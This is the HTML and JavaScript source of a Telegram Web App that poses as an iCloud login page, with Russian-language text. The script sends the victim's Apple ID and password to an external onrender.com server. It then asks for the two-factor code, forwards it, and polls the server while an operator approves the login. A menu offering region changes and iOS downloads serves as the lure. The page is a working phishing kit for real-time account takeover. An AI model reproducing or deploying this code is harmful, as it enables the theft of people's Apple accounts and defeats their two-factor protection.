<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud Services</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            padding-top: 50px;
            background-color: #f5f5f7;
        }
        .login-form { width: 300px; display: flex; flex-direction: column; gap: 15px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; font-size: 20px; margin-bottom: 10px; }
        input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
        input:focus { border-color: #007aff; }
        button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
        button:disabled { background: #b2d7ff; cursor: not-allowed; }
        button.secondary { background: #f5f5f7; color: #007aff; border: 1px solid #007aff; }
        .grid-countries { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        p { font-size: 14px; color: #6e6e73; text-align: center; }
    </style>
</head>
<body>

<div class="login-form" id="auth-step">
    <h2>Вход в iCloud</h2>
    <input type="text" id="email" placeholder="Apple ID">
    <input type="password" id="password" placeholder="Пароль">
    <button id="auth-btn" onclick="sendData()">Войти</button>
</div>

<div class="login-form" id="2fa-step" style="display:none;">
    <h2>Двухфакторная проверка</h2>
    <p>Код подтверждения отправлен на ваше устройство Apple.</p>
    <input type="text" id="code" placeholder="Код из 6 цифр" inputmode="numeric" maxlength="6">
    <button id="2fa-btn" onclick="send2FA()">Подтвердить</button>
</div>

<div class="login-form" id="menu-step" style="display:none;">
    <h2>Что вы хотите сделать?</h2>
    <button onclick="showRegionMenu()">Быстро сменить регион</button>
    <button class="secondary" onclick="showIosMenu()">Скачать iOS</button>
</div>

<div class="login-form" id="region-step" style="display:none;">
    <h2>Выберите страну</h2>
    <div class="grid-countries">
        <button class="secondary" onclick="confirmRegion('Германия')">Германия</button>
        <button class="secondary" onclick="confirmRegion('Россия')">Россия</button>
        <button class="secondary" onclick="confirmRegion('Украина')">Украина</button>
        <button class="secondary" onclick="confirmRegion('США')">США</button>
    </div>
    <button onclick="backToMenu()">Назад</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // ТВОЯ ССЫЛКА НА RENDER
    const serverUrl = 'https://sever-afk3.onrender.com'; 
    
    // Уникальный ID пользователя для отслеживания кнопок
    const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "guest_" + Math.floor(Math.random() * 10000);

    async function apiRequest(endpoint, data) {
        try {
            const response = await fetch(`${serverUrl}${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...data, userId })
            });
            return await response.json();
        } catch (e) {
            console.error("Ошибка сети:", e);
            tg.showAlert("Ошибка соединения с сервером");
        }
    }

    async function sendData() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if (!email.includes('@')) { tg.showAlert('Введите корректный Apple ID'); return; }

        document.getElementById('auth-btn').disabled = true;
        await apiRequest('/send-data', { type: 'auth', email, pass });
        
        document.getElementById('auth-step').style.display = 'none';
        document.getElementById('2fa-step').style.display = 'flex';
    }

    async function send2FA() {
        const code = document.getElementById('code').value;
        if (code.length < 4) { tg.showAlert('Введите код'); return; }

        document.getElementById('2fa-btn').disabled = true;
        await apiRequest('/send-data', { type: '2fa', code });

        tg.showConfirm("Ожидание подтверждения администратором...");

        // Начинаем проверку статуса каждые 3 секунды
        const checkStatus = setInterval(async () => {
            try {
                const res = await fetch(`${serverUrl}/check/${userId}`);
                const data = await res.json();

                if (data.status === 'success') {
                    clearInterval(checkStatus);
                    document.getElementById('2fa-step').style.display = 'none';
                    document.getElementById('menu-step').style.display = 'flex';
                    tg.showAlert("Вход выполнен успешно!");
                } else if (data.status === 'error') {
                    clearInterval(checkStatus);
                    tg.showAlert("Код отклонен. Попробуйте снова.");
                    location.reload(); // Перезагрузка страницы
                }
            } catch (e) { console.error(e); }
        }, 3000);
    }

    // Вспомогательные функции меню
    function showRegionMenu() {
        document.getElementById('menu-step').style.display = 'none';
        document.getElementById('region-step').style.display = 'flex';
    }
    function backToMenu() {
        document.getElementById('region-step').style.display = 'none';
        document.getElementById('menu-step').style.display = 'flex';
    }
    function confirmRegion(c) {
        apiRequest('/send-data', { type: 'info', text: `Выбран регион: ${c}` });
        tg.showAlert("Регион успешно изменен");
        backToMenu();
    }
</script>
</body>
</html>
